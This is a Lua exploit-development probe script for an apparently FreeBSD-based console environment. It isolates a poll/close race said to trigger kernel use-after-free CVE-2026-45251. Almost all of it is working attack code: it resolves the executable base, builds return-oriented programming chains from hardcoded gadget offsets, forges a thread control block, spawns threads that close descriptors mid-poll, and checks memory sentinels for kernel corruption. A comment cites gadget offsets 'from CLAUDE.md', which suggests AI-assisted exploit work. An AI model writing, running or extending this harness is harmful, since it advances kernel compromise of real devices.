-- CRASH_CLASS: MODERATE
-- PROBE 507a: isolate poll/close race crash — chain test vs kernel UAF
--
-- 500a/502a crashed at the first race iteration. This probe determines:
-- (1) Does the child close chain work at all? (no poll, just close + verify)
-- (2) Does poll on a fd closed by a child work sequentially? (no race)
-- (3) Does the concurrent race itself crash? (the CVE-2026-45251 test)
--
-- Each step reports before and after, so the crash point is visible.

print("=== PROBE 507a: poll/close race isolation ===")
print("")

------------------------------------------------------------------ helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_hex(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

------------------------------------------------------------------ syscalls
local sc6    = make_syscall(6)     -- close
local sc20   = make_syscall(20)    -- getpid
local sc73   = make_syscall(73)    -- munmap
local sc97   = make_syscall(97)    -- socket
local sc135  = make_syscall(135)   -- socketpair
local sc165  = make_syscall(165)   -- sysarch
local sc209  = make_syscall(209)   -- poll
local sc240  = make_syscall(240)   -- nanosleep
local sc455  = make_syscall(455)   -- thr_new
local sc477  = make_syscall(477)   -- mmap
local sc593  = make_syscall(593)   -- dynlib_get_info
local sc624  = make_syscall(624)   -- VM op counter

local pid = to_num(sc20())
print("pid: " .. pid)

------------------------------------------------------------------ eboot base
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = safe_rd(info + 0x108)
local eb_hi = safe_rd(info + 0x10C)
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))
print("eboot: " .. fmt_hex(eboot))

local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if not fn_str then print("FATAL: no fn_addr"); return end
local fn_addr = uint64(fn_str)
print("fn_addr: " .. fn_str)

------------------------------------------------------------------ gadgets (from CLAUDE.md)
local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local pop_rsi_ret = eboot + uint64(0xD77D)

------------------------------------------------------------------ fake TCB (once)
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFF8, 8 do safe_wq(fake_tcb + i, fake_tcb) end
local tcb_ptr = memory.alloc(8)
safe_wq(tcb_ptr, fake_tcb)

------------------------------------------------------------------ sleep helper
local ts_buf = memory.alloc(16)
local function msleep(ms)
    safe_wq(ts_buf, uint64(0))
    safe_wq(ts_buf + 8, uint64(ms * 1000000))
    pcall(function() sc240(uint64(to_num(ts_buf)), uint64(0)) end)
end

------------------------------------------------------------------ create socketpair, return {fd0, fd1}
local function make_pair()
    local sv = memory.alloc(8)
    safe_wd(sv, 0xFFFFFFFF)
    safe_wd(sv + 4, 0xFFFFFFFF)
    local ok = pcall(function()
        sc135(uint64(1), uint64(2), uint64(0), uint64(to_num(sv)))
    end)
    if not ok then return nil end
    local f0, f1 = safe_rd(sv), safe_rd(sv + 4)
    if f0 and f0 < 0xFFFF and f1 and f1 < 0xFFFF then return {f0, f1} end
    return nil
end

local STACK_SIZE = 0x200000

------------------------------------------------------------------ spawn child that executes a ROP chain
-- Chain: sysarch(SET_FSBASE=129, tcb_ptr) -> <user_chain> -> thr_exit(0)
-- Returns: {ok=bool, tid=number}
local function spawn_child_chain(chain_gadgets)
    local child_stack = sc477(uint64(0), uint64(STACK_SIZE), uint64(0x3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local cs_h = get_hi_lo(child_stack)
    if cs_h == 0 and to_num(child_stack) == 0 then return {ok=false} end

    -- compute RSP: ((base + size) & ~0xF) - 8
    local top = child_stack + uint64(STACK_SIZE)
    local top_lo = to_num(top)
    local rsp_val = top - uint64(top_lo % 16) - uint64(8)

    -- write chain at RSP
    -- start_func = pop_rsi_ret, arg = 129 (in rdi for sysarch cmd)
    -- [RSP+0] = tcb_ptr (popped into rsi for sysarch addr)
    -- [RSP+8] = pop_rax_ret
    -- [RSP+16] = 165 (SYS_sysarch)
    -- [RSP+24] = fn_addr (syscall;ret)
    -- then user chain gadgets
    -- then thr_exit epilogue
    local off = 0
    local function wq(val) safe_wq(rsp_val + off, val); off = off + 8 end

    -- sysarch(SET_FSBASE=129, tcb_ptr)
    wq(tcb_ptr)        -- rsi
    wq(pop_rax_ret)
    wq(uint64(165))    -- sysarch
    wq(fn_addr)

    -- user-supplied gadgets
    for _, g in ipairs(chain_gadgets) do
        wq(g)
    end

    -- thr_exit(0)
    wq(pop_rdi_ret)
    wq(uint64(0))
    wq(pop_rax_ret)
    wq(uint64(431))
    wq(fn_addr)

    -- thr_param
    local param = memory.alloc(0x40)
    for j = 0, 0x38, 4 do safe_wd(param + j, 0) end
    safe_wq(param + 0x00, pop_rsi_ret)         -- start_func
    safe_wq(param + 0x08, uint64(129))          -- arg (rdi = SET_FSBASE)
    safe_wq(param + 0x10, child_stack)          -- stack_base
    safe_wq(param + 0x18, uint64(STACK_SIZE))   -- stack_size
    local tid_buf = memory.alloc(8)
    safe_wq(tid_buf, uint64(0))
    safe_wq(param + 0x30, tid_buf)              -- child_tid ptr

    local t_ok, t_ret = pcall(function()
        return sc455(uint64(to_num(param)), uint64(0x38))
    end)

    local tid = safe_rd(tid_buf)
    local rv = 0
    if t_ok then rv = to_num(t_ret) end

    return {ok = t_ok and rv == 0, tid = tid or 0, stack = child_stack}
end

local function cleanup_stack(stack_addr)
    pcall(function() sc73(stack_addr, uint64(STACK_SIZE)) end)
end

-- ============================================================
-- STEP 1: Child thread with close(fd) — NO poll race
-- ============================================================
print("")
print("=== STEP 1: child close(fd) — no race ===")
print("  creating socketpair...")

local pair1 = make_pair()
if not pair1 then
    print("  FATAL: socketpair failed")
    return
end
print(string.format("  fds: [%d, %d]", pair1[1], pair1[2]))

-- verify fd is alive
local ok_pre, ret_pre = pcall(function()
    -- fstat(189) to check fd
    local sc189 = make_syscall(189)
    return sc189(uint64(pair1[1]), memory.alloc(0x100))
end)
print("  fstat(fd0) before: " .. (ok_pre and ("ret=" .. to_num(ret_pre)) or "CRASH"))

-- marker: child will write here after close
local marker1 = memory.alloc(8)
safe_wq(marker1, uint64(0xAAAAAAAA))

-- child chain: close(fd0) then write marker
-- mov [rdi], rax; ret at eboot+0x92C67
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local child_chain_1 = {
    -- close(pair1[1])
    pop_rdi_ret,
    uint64(pair1[1]),
    pop_rax_ret,
    uint64(6),      -- SYS_close
    fn_addr,
    -- write 0xBBBBBBBB to marker (rax=close retval, use different marker)
    -- Actually: pop rax to set marker value, then mov [rdi], rax
    pop_rdi_ret,
    marker1,
    pop_rax_ret,
    uint64(0xBBBBBBBB),
    mov_rdi_rax_ret,
}

print("  spawning child to close fd0...")
local r1 = spawn_child_chain(child_chain_1)
print(string.format("  thr_new: ok=%s tid=%d", tostring(r1.ok), r1.tid))

-- wait for child
msleep(100)

local marker1_val = safe_rq(marker1)
print("  marker after child: " .. fmt_hex(marker1_val))
if to_num(marker1_val) == 0xBBBBBBBB then
    print("  CHILD EXECUTED SUCCESSFULLY")
else
    print("  WARNING: child may not have executed or crashed")
end

-- check if fd0 is closed now
local ok_post, ret_post = pcall(function()
    local sc189 = make_syscall(189)
    return sc189(uint64(pair1[1]), memory.alloc(0x100))
end)
if ok_post then
    print("  fstat(fd0) after: ret=" .. to_num(ret_post) .. (to_num(ret_post) == -1 and " [CLOSED OK]" or " [STILL OPEN?]"))
else
    print("  fstat(fd0) after: CRASH")
end

-- cleanup
pcall(function() sc6(uint64(pair1[2])) end)
if r1.stack then cleanup_stack(r1.stack) end

-- ============================================================
-- STEP 2: Poll a fd, then child closes it — sequential, no race
-- ============================================================
print("")
print("=== STEP 2: poll then child-close — sequential ===")

local pair2 = make_pair()
if not pair2 then print("  FATAL: socketpair failed"); return end
print(string.format("  fds: [%d, %d]", pair2[1], pair2[2]))

-- poll fd0 first (timeout=0, non-blocking)
local pollfd = memory.alloc(8)
safe_wd(pollfd, pair2[1])
safe_wd(pollfd + 4, 0x0001)

local ok_p2, ret_p2 = pcall(function()
    return sc209(uint64(to_num(pollfd)), uint64(1), uint64(0))
end)
if ok_p2 then
    local rev = safe_rd(pollfd + 4)
    print(string.format("  poll(fd0, timeout=0) ret=%d revents=0x%04X",
        to_num(ret_p2), (rev or 0) % 65536))
else
    print("  poll CRASHED (unexpected)")
end

-- now close fd0 via child
local marker2 = memory.alloc(8)
safe_wq(marker2, uint64(0xAAAAAAAA))
local child_chain_2 = {
    pop_rdi_ret, uint64(pair2[1]),
    pop_rax_ret, uint64(6), fn_addr,
    pop_rdi_ret, marker2,
    pop_rax_ret, uint64(0xCCCCCCCC),
    mov_rdi_rax_ret,
}
print("  spawning child to close fd0...")
local r2 = spawn_child_chain(child_chain_2)
msleep(100)
print("  marker2: " .. fmt_hex(safe_rq(marker2)))

-- poll the now-closed fd (should get POLLNVAL)
safe_wd(pollfd, pair2[1])
safe_wd(pollfd + 4, 0x0001)
local ok_p2b, ret_p2b = pcall(function()
    return sc209(uint64(to_num(pollfd)), uint64(1), uint64(0))
end)
if ok_p2b then
    local rev = safe_rd(pollfd + 4)
    print(string.format("  poll(closed fd0, timeout=0) ret=%d revents=0x%04X",
        to_num(ret_p2b), (rev or 0) % 65536))
else
    print("  poll(closed fd) CRASHED")
end

pcall(function() sc6(uint64(pair2[2])) end)
if r2.stack then cleanup_stack(r2.stack) end

-- ============================================================
-- STEP 3: The actual race — poll(fd, POLLIN, 5000) + child close(fd)
-- ============================================================
print("")
print("=== STEP 3: CONCURRENT poll+close race (1 iteration) ===")
print("  THIS IS THE CVE-2026-45251 TEST")
print("")

local pair3 = make_pair()
if not pair3 then print("  FATAL: socketpair failed"); return end
print(string.format("  fds: [%d, %d]", pair3[1], pair3[2]))

-- sentinel page for kernel corruption detection
local sentinel = memory.alloc(0x100)
for i = 0, 0xF8, 8 do safe_wq(sentinel + i, uint64(0xDEAD0000 + i)) end

-- VM ops before
local vm_before = to_num(sc624())
print("  VM ops before: " .. vm_before)

-- Build child chain: sleep 1ms → close(fd0) → write marker → thr_exit
-- The 1ms sleep gives main thread time to enter poll()
local marker3 = memory.alloc(8)
safe_wq(marker3, uint64(0xAAAAAAAA))

-- For sleep: nanosleep(ts, NULL)  — needs ts with 1ms
local child_ts = memory.alloc(16)
safe_wq(child_ts, uint64(0))           -- sec=0
safe_wq(child_ts + 8, uint64(1000000)) -- nsec=1ms

local child_chain_3 = {
    -- nanosleep(child_ts, 0): rdi=child_ts, rsi=0 but rsi is tcb_ptr from init...
    -- Actually rsi still has tcb_ptr from sysarch. We need to set rdi and rsi.
    -- Use pop_rdi for ts, pop_rsi for NULL remnant
    pop_rdi_ret, child_ts,
    pop_rsi_ret, uint64(0),        -- remnant ptr (NULL)
    pop_rax_ret, uint64(240),      -- SYS_nanosleep
    fn_addr,
    -- close(fd0)
    pop_rdi_ret, uint64(pair3[1]),
    pop_rax_ret, uint64(6),
    fn_addr,
    -- write marker
    pop_rdi_ret, marker3,
    pop_rax_ret, uint64(0xDDDDDDDD),
    mov_rdi_rax_ret,
}

print("  spawning child (will sleep 1ms then close fd0)...")
print("  MARK: pre-spawn")
local r3 = spawn_child_chain(child_chain_3)
print(string.format("  thr_new: ok=%s tid=%d", tostring(r3.ok), r3.tid))

-- IMMEDIATELY enter blocking poll — race the child's close
print("  MARK: entering poll(fd0, POLLIN, 5000ms)...")
local ok_race, ret_race = pcall(function()
    return sc209(uint64(to_num(pollfd)), uint64(1), uint64(5000))
end)

-- If we get here, the process survived
print("  MARK: poll returned!")
if ok_race then
    local rev = safe_rd(pollfd + 4)
    print(string.format("  poll ret=%d revents=0x%04X",
        to_num(ret_race), (rev or 0) % 65536))
else
    print("  poll CRASHED in pcall")
end

-- wait for child to finish
msleep(50)
print("  marker3: " .. fmt_hex(safe_rq(marker3)))

-- VM ops after
local vm_after = to_num(sc624())
print("  VM ops after: " .. vm_after .. " (delta=" .. (vm_after - vm_before) .. ")")

-- sentinel check
print("  sentinel check:")
local corrupted = 0
for i = 0, 0xF8, 8 do
    local val = safe_rq(sentinel + i)
    local expected = 0xDEAD0000 + i
    if to_num(val) ~= expected then
        print(string.format("    +0x%02X: expected 0x%X got %s", i, expected, fmt_hex(val)))
        corrupted = corrupted + 1
    end
end
if corrupted == 0 then
    print("  sentinels: ALL OK")
else
    print("  sentinels: " .. corrupted .. " CORRUPTED!")
end

pcall(function() sc6(uint64(pair3[2])) end)
if r3.stack then cleanup_stack(r3.stack) end

-- ============================================================
-- STEP 4: Same race but with plain socket (not socketpair)
-- ============================================================
print("")
print("=== STEP 4: race with AF_INET UDP socket ===")

local sc97_loc = make_syscall(97)
local ok_udp, udp_fd = pcall(function()
    return sc97_loc(uint64(2), uint64(2), uint64(0))
end)
if not ok_udp or to_num(udp_fd) < 1 then
    print("  UDP socket failed, skip")
else
    local ufd = to_num(udp_fd)
    print("  UDP fd=" .. ufd)

    local marker4 = memory.alloc(8)
    safe_wq(marker4, uint64(0xAAAAAAAA))

    local child_ts4 = memory.alloc(16)
    safe_wq(child_ts4, uint64(0))
    safe_wq(child_ts4 + 8, uint64(1000000))

    local child_chain_4 = {
        pop_rdi_ret, child_ts4,
        pop_rsi_ret, uint64(0),
        pop_rax_ret, uint64(240),
        fn_addr,
        pop_rdi_ret, uint64(ufd),
        pop_rax_ret, uint64(6),
        fn_addr,
        pop_rdi_ret, marker4,
        pop_rax_ret, uint64(0xEEEEEEEE),
        mov_rdi_rax_ret,
    }

    safe_wd(pollfd, ufd)
    safe_wd(pollfd + 4, 0x0001)

    print("  spawning child (1ms sleep then close)...")
    local r4 = spawn_child_chain(child_chain_4)
    print(string.format("  thr_new: ok=%s tid=%d", tostring(r4.ok), r4.tid))

    print("  MARK: entering poll(udp, POLLIN, 5000ms)...")
    local ok_r4, ret_r4 = pcall(function()
        return sc209(uint64(to_num(pollfd)), uint64(1), uint64(5000))
    end)

    print("  MARK: poll returned!")
    if ok_r4 then
        local rev = safe_rd(pollfd + 4)
        print(string.format("  poll ret=%d revents=0x%04X",
            to_num(ret_r4), (rev or 0) % 65536))
    else
        print("  poll CRASHED")
    end

    msleep(50)
    print("  marker4: " .. fmt_hex(safe_rq(marker4)))
    if r4.stack then cleanup_stack(r4.stack) end
end

-- ============================================================
-- STEP 5: Race with kqueue fd
-- ============================================================
print("")
print("=== STEP 5: race with kqueue fd ===")

local sc362_loc = make_syscall(362)
local ok_kq, kq_fd = pcall(function() return sc362_loc() end)
if not ok_kq or to_num(kq_fd) < 1 then
    print("  kqueue failed, skip")
else
    local kfd = to_num(kq_fd)
    print("  kqueue fd=" .. kfd)

    local marker5 = memory.alloc(8)
    safe_wq(marker5, uint64(0xAAAAAAAA))

    local child_ts5 = memory.alloc(16)
    safe_wq(child_ts5, uint64(0))
    safe_wq(child_ts5 + 8, uint64(1000000))

    local child_chain_5 = {
        pop_rdi_ret, child_ts5,
        pop_rsi_ret, uint64(0),
        pop_rax_ret, uint64(240),
        fn_addr,
        pop_rdi_ret, uint64(kfd),
        pop_rax_ret, uint64(6),
        fn_addr,
        pop_rdi_ret, marker5,
        pop_rax_ret, uint64(0x55555555),
        mov_rdi_rax_ret,
    }

    safe_wd(pollfd, kfd)
    safe_wd(pollfd + 4, 0x0001)

    print("  spawning child (1ms sleep then close)...")
    local r5 = spawn_child_chain(child_chain_5)
    print(string.format("  thr_new: ok=%s tid=%d", tostring(r5.ok), r5.tid))

    print("  MARK: entering poll(kqueue, POLLIN, 5000ms)...")
    local ok_r5, ret_r5 = pcall(function()
        return sc209(uint64(to_num(pollfd)), uint64(1), uint64(5000))
    end)

    print("  MARK: poll returned!")
    if ok_r5 then
        local rev = safe_rd(pollfd + 4)
        print(string.format("  poll ret=%d revents=0x%04X",
            to_num(ret_r5), (rev or 0) % 65536))
    else
        print("  poll CRASHED")
    end

    msleep(50)
    print("  marker5: " .. fmt_hex(safe_rq(marker5)))
    if r5.stack then cleanup_stack(r5.stack) end
end

------------------------------------------------------------------ final verification
print("")
print("=== FINAL VERIFICATION ===")
local pid2 = to_num(sc20())
print("pid: " .. pid2 .. (pid2 == pid and " [OK]" or " [CHANGED!]"))
print("")
print("=== PROBE 507a COMPLETE ===")
